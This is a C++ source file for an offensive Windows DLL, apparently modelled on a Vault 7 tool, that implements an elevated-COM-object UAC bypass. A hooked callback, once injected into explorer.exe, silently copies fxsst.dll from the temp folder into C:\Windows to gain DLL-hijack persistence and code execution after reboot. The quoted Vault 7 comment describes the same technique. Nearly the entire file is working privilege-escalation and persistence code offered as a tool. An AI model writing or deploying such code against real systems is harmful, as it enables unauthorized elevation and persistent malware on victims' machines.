/*
 * Filename: fxsst.cpp
 *
 * Classification:
 * Classified By:
 *
 * Tool Name: Artillery
 * Requirement #:2022-1337
 *
 * Author: Hacker Fantastic
 * Date Created:        12/30/2023
 * Version 1.0:12/30/2023 (00:00)
 *
 * Example of Artillery usage, taken from the Vault 7 description below.
 * 
 * "Elevated COM Object UAC Bypass (WIN 7) Overview
 * Windows 7 includes a feature that enables approved applications running with 
 * Admin privileges to perform system operations without the UAC prompt. One method 
 * an application can use to do this is to create an “Elevated COM Object” and use it
 * to perform the operation. For example, a DLLloaded into explorer.exe can create an 
 * elevated IFileOperation object and use it to delete a file from the Windows directory. 
 * This technique can be combined with process injection to produce a more direct UAC bypass.
 * The code sample below must be executed within the context of a process approved for 
 * elevation, otherwise it will trigger the UAC prompt. Most Microsoft-signed executables 
 * that ship with Windows are approved, most usefully explorer.exe, as it is generally running, 
 * but also others such as calc.exe or notepad.exe may be useful if executing in explorer’s 
 * process is alerting to a PSP.
 * 
 * HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void **ppv)
 * {
 *	BIND_OPTS3 bo;
 *	WCHAR wszCLSID[50];
 *	WCHAR wszMon[300];
 *
 *	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID)/sizeof(wszCLSID[0]));
 *	HRESULT hr = StringCchPrintfW(wszMon, sizeof(wszMon)/sizeof(wszMon[0]), L"Elevation:Administrator!new:%s", wszCLSID);
 *	if (FAILED(hr))
 *		return hr;
 *	memset(&bo, 0, sizeof(bo));
 *	bo.cbStruct = sizeof(bo);
 *	bo.hwnd = hwnd;
 *	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
 *	return CoGetObject(wszMon, &bo, riid, ppv);
 * }
 * 
 * void ElevatedDelete()
 * {
 *	MessageBox(NULL, "DELETING", "TESTING", MB_OK);
 *
 *	// This is only availabe on Vista and higher
 *	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
 *	IFileOperation *pfo;
 *	hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
 *	pfo->SetOperationFlags(FOF_NO_UI);
 *	IShellItem *item = NULL;
 *	hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\TEST.DLL", NULL, IID_PPV_ARGS(&item));
 *	pfo->DeleteItem(item, NULL);
 *	pfo->PerformOperations();
 *	item->Release();
 *	pfo->Release();
 *	CoUninitialize();
 * }
 * 
 * A standalone sample implementation of this technique is available in the UACBypass project. It can be found in 
 * the Malware Component Library, currently located in Umbrage SVN (To be moved to Stash soon™...)
 *
 * The sample copies a DLL file into the C:\Windows\ directory without prompting UAC. This can 
 * be combined with WinFax DLL Hijacking to achieve code execution after reboot
 * the C:\Windows\ directory without prompting UAC. This can be combined with WinFax DLL Hijacking 
 * to achieve code execution after reboot"
 * 
 */
#include "pch.h"

#pragma comment(lib,"Ole32.lib") 
#pragma comment(lib,"User32.lib")
#pragma comment(lib, "Shell32.lib")

HMODULE hModuleGlobal = NULL; // Global variable to hold the module handle

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void** ppv)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[50];
	WCHAR wszMon[300];
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID) / sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintfW(wszMon, sizeof(wszMon) / sizeof(wszMon[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMon, &bo, riid, ppv);
}

void ElevatedCopy()
{
    // This is only available on Vista and higher
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr))
    {
        return;
    }
    IFileOperation* pfo;
    hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
    if (FAILED(hr))
    {
        return;
    }
    pfo->SetOperationFlags(FOF_NO_UI);
    IShellItem* from = NULL, * to = NULL;
    // Get the %TEMP% directory
    wchar_t szTempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, szTempDir);
    // Get the long form of the path name
    wchar_t szLongTempDir[MAX_PATH];
    GetLongPathNameW(szTempDir, szLongTempDir, MAX_PATH);
    // Calculate the length of the new string
    size_t len = wcslen(szLongTempDir) + wcslen(L"fxsst.dll") + 1; // +1 for null terminator
    // Allocate memory for the new string
    wchar_t* szFxsstDllPath = new wchar_t[len];
    // Build the full path for the DLL
    wcscpy_s(szFxsstDllPath, len - 1, szLongTempDir);
    wcscat_s(szFxsstDllPath, len, L"fxsst.dll");
    SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
    SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
    pfo->CopyItem(from, to, L"fxsst.dll", NULL);
    pfo->PerformOperations();
    from->Release();
    to->Release();
    pfo->Release();
    if (szFxsstDllPath)
        delete[] szFxsstDllPath;
    CoUninitialize();
}

extern "C" __declspec(dllexport) LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    // increase the DLL reference counter to stop unloading as per Vault7
    if (nCode >= 0 && hModuleGlobal == NULL)
    {
        TCHAR szModulePath[MAX_PATH];
        GetModuleFileName(hModuleGlobal, szModulePath, MAX_PATH);
        hModuleGlobal = LoadLibrary(szModulePath);
        // Execute the UAC bypass and persist a fxsst.dll
        ElevatedCopy();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	// unused 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:       
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}